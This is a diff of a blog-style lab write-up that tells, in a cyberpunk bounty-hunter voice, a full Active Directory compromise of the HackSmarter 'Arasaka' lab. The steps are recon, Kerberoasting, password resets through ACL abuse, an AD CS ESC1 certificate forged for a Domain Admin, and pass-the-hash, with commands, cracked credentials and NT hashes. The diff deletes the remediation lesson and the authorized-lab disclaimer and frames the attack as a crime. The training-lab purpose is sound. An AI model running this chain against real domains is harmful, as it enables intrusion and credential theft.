@@ -9,39 +9,38 @@ toc: true
 description: "Another day in night city."
 ---
 
-*Job type: Bounty 
-Target: Arasaka Corporation*
+*Job type: Bounty* 
+*Target: Arasaka Corporation*
 
-A corpo spy reached out to my a broker across the wire, they had got their hands on a low priv account for the Arasaka Corperation. 
-
-Brief was short. Arasaka's perimeter looked solid on paper. Nobody had checked whether a low-privilege "trusted" account could walk somewhere it shouldn't. That's the job: start inside with minimal access, see how far the trust extends.
-
-It extended all the way to Domain Admin.
+Brief was short, a corpo spy reached out to my a broker across the wire, they had got their hands on a low priv account for the Arasaka Corperation.
+The objective, compromise the network infrastructure and ensure that they could come in through the gates undetected later.  Promise of more work down the road, more challenging.. well paying work. 
+First though, I was to prove I am capable. What a joke, I will show them how capable I am. 
 
 ---
 
-## Phase 0 — The Drop
+## Phase 0 — The Intel Package
 
-No initial exploitation. Client handed over a live domain account on day one:
+No initial exploitation. Client handed over a live domain account on day one along with access to a corperate VPN. This is the only initial access that was given, it was all that was needed.
+I'm a professional after all.
 
 ```
 Target IP: 10.0.17.23
 Creds: faraday:hacksmarter123
 ```
 
-`faraday`. Every environment has one of these: a low-and-slow account nobody rotates. Starting point.
+`faraday`. This is are starting access, from here, I will case their enviroment and see what I am working with. 
 
 ---
 
-## Phase 1 — Casing the Tower
+## Phase 1 — Casing the Infrastructure. 
 
-Full port sweep first, know the target before touching anything else.
+Full port sweep first, know the target before touching anything else. Don't want any nasty surprises. 
 
 ```bash
 nmap -sVC -A -T4 "$TARGET"_full_ports "$TARGET"
 ```
 
-Confirmed a full Active Directory domain controller:
+Based on recon, it looks like we have initial access to a domain controller out the gate:
 
 ```
 PORT     STATE SERVICE       VERSION
@@ -59,7 +58,7 @@ PORT     STATE SERVICE       VERSION
 3389/tcp open  ms-wbt-server Microsoft Terminal Services
 ```
 
-RDP banner confirmed hostname and domain:
+RDP banner gave us a  hostname and domain:
 
 ```
 rdp-ntlm-info:
@@ -71,9 +70,9 @@ rdp-ntlm-info:
   Product_Version:    10.0.20348
 ```
 
-`DC01.hacksmarter.local`, Windows Server 2022, SMB signing enforced. Hardened on the surface.
+`DC01.hacksmarter.local`, Windows Server 2022, SMB signing enforced.
 
-Added it to the local resolver:
+I added it to the local resolver:
 
 ```bash
 sudo nano /etc/hosts
@@ -84,9 +83,9 @@ sudo nano /etc/hosts
 
 ---
 
-## Phase 2 — Testing the Access Code
+## Phase 2 — Trust, but Verify.
+Sometimes clients make typos, or a bit gets misplaced here and there in transmission, before anything we need to verify the account that was given to us:
 
-Verify the handed-off credential before building anything on top of it.
 
 ```bash
 nxc smb hacksmarter.local -u faraday -p 'hacksmarter123'
@@ -97,7 +96,7 @@ SMB   10.0.17.23  445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01)
 SMB   10.0.17.23  445  DC01  [+] hacksmarter.local\faraday:hacksmarter123
 ```
 
-Valid. Moving into enumeration.
+Access verified. Now lets see what we can do with it. 
 
 ### Share enumeration
 
@@ -105,9 +104,9 @@ Valid. Moving into enumeration.
 nxc smb hacksmarter.local -u faraday -p 'hacksmarter123' --shares
 ```
 
-Default shares only: `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`. Nothing nonstandard.
+Default shares only: `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`. Nothing out of the ordinary.
 
-### Mapping the staff directory
+### Walking the directory
 
 ```bash
 nxc smb hacksmarter.local -u faraday -p 'hacksmarter123' --users
@@ -124,17 +123,17 @@ kei.svc        — Trapped for eternity
 Silverhand.svc — Trapped for eternity
 ```
 
-`Soulkiller.svc` doing certificate management was worth flagging early. Service accounts tied to PKI are usually worth a second look.
+`Soulkiller.svc` doing certificate management was worth flagging early. Service accounts tied to PKI are usually worth a second look. Aside from that, some rather creepy notes on these accounts. 
 
 ### RID brute force
 
-Full account enumeration by RID, no guessing:
+Full account enumeration by RID, jus tto make sure:
 
 ```bash
 nxc smb hacksmarter.local -u faraday -p 'hacksmarter123' --rid-brute | grep -ia SidTypeUser
 ```
 
-Confirmed all fifteen users plus the machine account `DC01$`. Cleaned into a target list:
+Confirmed all fifteen users plus the machine account `DC01$`. Lets get this cleaned up into a target list:
 
 ```bash
 cat a.txt | cut -d '\' -f 2 | cut -d '(' -f 1 > users.txt
@@ -153,7 +152,7 @@ Domain Password Complex: 0
 Account Lockout Threshold: None
 ```
 
-No complexity enforcement, no lockout threshold. Weak passwords were going to be viable.
+No complexity enforcement or lockout threshold. Weak passwords were going to be a viable possibility. When people aren't held to standards, they get lazy. It's in our nature, which is good for me. No vulnerability is a lower hanging fruit that a human.
 
 ### LDAP and the domain dump
 
@@ -182,17 +181,17 @@ ldapdomaindump --user "$DOMAIN"\\"$USER" --password "$PASSWORD" --outdir ldapdom
 
 `Domain Admins` had two members: `Administrator` and `the_emperor`, which the directory listed as **Saburo Arasaka**, still logged in as a live account. `Yorinobu` sat in `Remote Management Users` and `Remote Desktop Users`, meaning direct machine access. `Soulkiller.svc` turned up again, description confirming certificate management for the "soulkiller AI," tied to a computer object at `AI/blackwall.hacksmarter.local`.
 
-A PKI service account named after the wall meant to keep rogue AI out. Noted and moved on.
+A PKI service account named after the wall meant to keep rogue AI out. Interesting.
 
-### RPC — a dead end
+### RPC - a dead end
 
 ```bash
 rpcclient -U 'faraday' hacksmarter.local
 ```
 
-Same user list and domain info back (`ROLE_DOMAIN_PDC`, 49 total users). No new data, but confirms the picture.
+Same user list and domain info back (`ROLE_DOMAIN_PDC`, 49 total users). No new data, but best to measure twice a cut once.
 
-### BloodHound — drawing the map
+### BloodHound
 
 Enough names. Time to map the actual relationships between them.
 
@@ -209,21 +208,21 @@ rusthound -d hacksmarter.local -u "$USER" -p "$PASSWORD" -n "$TARGET" -o . --zip
 RustHound Enumeration Completed at 12:15:33 on 09/21/26! Happy Graphing!
 ```
 
-Loaded into BloodHound CE. One clean path stood out:
+Loaded into BloodHound CE. A path was already standing out:
 
 ```
 alt.svc  --GenericAll-->  Yorinobu  --GenericWrite-->  Soulkiller.svc
 ```
 
-`alt.svc` held `GenericAll` over `Yorinobu`. `Yorinobu` held `GenericWrite` over `Soulkiller.svc`. A direct chain from a low-value service account to the account managing the domain's certificate infrastructure.
+`alt.svc` held `GenericAll` over `Yorinobu`. `Yorinobu` held `GenericWrite` over `Soulkiller.svc`. A direct chain from a low-value service account to the account managing the domain's certificate infrastructure. Not great for them, fantastic for me.
 
 ---
 
-## Phase 3 — Walking the Chain
+## Phase 3 - Executing the Chain
 
 ### Step 1: Kerberoasting alt.svc
 
-`alt.svc` had a registered SPN, which makes it Kerberoastable: request a ticket, crack offline, no repeated auth attempts against the DC.
+`alt.svc` had a registered SPN, which makes it Kerberoastable: request a ticket, crack offline, no repeated auth attempts against the DC to trigger any defences.
 
 ```bash
 mkdir krb && cd krb
@@ -254,11 +253,11 @@ nxc smb hacksmarter.local -u alt.svc -p 'babygirl1' --shares
 SMB  10.0.17.23  445  DC01  [+] hacksmarter.local\alt.svc:babygirl1
 ```
 
-First account down.
+First account down. On to the next.
 
-### Step 2: Riding GenericAll into Yorinobu
+### Step 2: GenericAll into Yorinobu
 
-`alt.svc` had `GenericAll` over `Yorinobu`. Full control, meaning a direct password reset.
+`alt.svc` had `GenericAll` over `Yorinobu`. That means we have full control, meaning a direct password reset is viable.
 
 ```bash
 net rpc password "yorinobu" "hacked" -U "hacksmarter.local"/"alt.svc"%"babygirl1" -S $TARGET
@@ -287,7 +286,7 @@ hacksmarter\yorinobu
 DC01
 ```
 
-Shell on the domain controller.
+Shell on the domain controller, it's not loking good for our chums over at Arasaka right about now, wonder whos head on a platter will be served when their forensics team finally understands what happened. Feel bad for their netrunners on one hand, on the other, they knew what they signed up for.
 
 ```bash
 whoami /all
@@ -351,7 +350,7 @@ Access to the certificate management account.
 
 ---
 
-## Phase 4 — The Blackwall Has a Crack In It
+## Phase 4 - I see a crack in the blackwall
 
 `Soulkiller.svc` exists for certificate management, so the next step was checking what that account can actually do against the CA.
 
@@ -374,9 +373,9 @@ Enrollment Rights : HACKSMARTER.LOCAL\Soulkiller.svc
     ESC1 : Enrollee supplies subject and template allows client authentication.
 ```
 
-**ESC1.** Requester can name any subject, template allows client auth, and `Soulkiller.svc` has enrollment rights. That's enough to mint a certificate for any identity in the domain.
+**ESC1.** Requester can name any subject, template allows client auth, and `Soulkiller.svc` has enrollment rights. That's enough to mint a certificate for any identity in the domain, and mint we will.
 
-### Choosing a face to wear
+### Choosing what face to wear
 
 Only one target made sense: the account at the top of `Domain Admins`.
 
@@ -409,7 +408,7 @@ certipy req -u soulkiller.svc -p 'MYpassword123#' -ca hacksmarter-DC01-CA \
 [*] Saving certificate and private key to 'the_emperor.pfx'
 ```
 
-CA signed it without validation. As far as the PKI was concerned, this was now `the_emperor`.
+CA signed it without validation. As far as the PKI was concerned, this was now `the_emperor`. I WAS NOW the Emperor.
 
 ### Cashing it in
 
@@ -425,11 +424,11 @@ certipy auth -pfx the_emperor.pfx -dc-ip $TARGET
 aad3b435b51404eeaad3b435b51404ee:d87640b0d83dc7f90f5f30bd6789b133
 ```
 
-Full TGT and NT hash for the founder's account, off a certificate the domain's own CA issued without question.
+Full TGT and NT hash for the founder's account, off a certificate the domain's own CA issued without question. Ironic isn't it?
 
 ---
 
-## Phase 5 — Sitting on the Throne
+## Phase 5 Claiming my rightful place at the throne
 
 ```bash
 evil-winrm -i hacksmarter.local -u the_emperor -H d87640b0d83dc7f90f5f30bd6789b133
@@ -465,8 +464,6 @@ Domain Admin, full privilege set, DC01.
 
 ## Run Debrief
 
-Full chain, start to finish:
-
 1. **Assumed breach foothold** (`faraday`) → domain recon over SMB/LDAP/RPC
 2. **Kerberoasting** a weak service-account password (`alt.svc` → `babygirl1`)
 3. **ACL abuse #1** — `GenericAll` → password reset onto `Yorinobu`
@@ -474,10 +471,6 @@ Full chain, start to finish:
 5. **AD CS ESC1** — forged a certificate as `the_emperor` (Domain Admin) via a template that allowed the requester to supply their own subject
 6. **Domain Admin** via `certipy auth` → NT hash → WinRM
 
-Nothing in this chain requires a zero-day. A password audit and a review of certificate templates would have caught every step. Weak service-account credentials and an over-permissioned ACL chain did most of the work; the ESC1 misconfiguration in AD CS closed it out. The perimeter was never the problem, the internal trust relationships were.
-
-Ghost out.
+All that money, and they didn't last but minutes. Guess money really can't replace skill.  
 
 ---
-
-*This post documents a lab exercise completed on the HackSmarter platform ("Arasaka") in a fully authorized, sandboxed environment. All commands, tool output, and findings above are taken directly from engagement notes.*
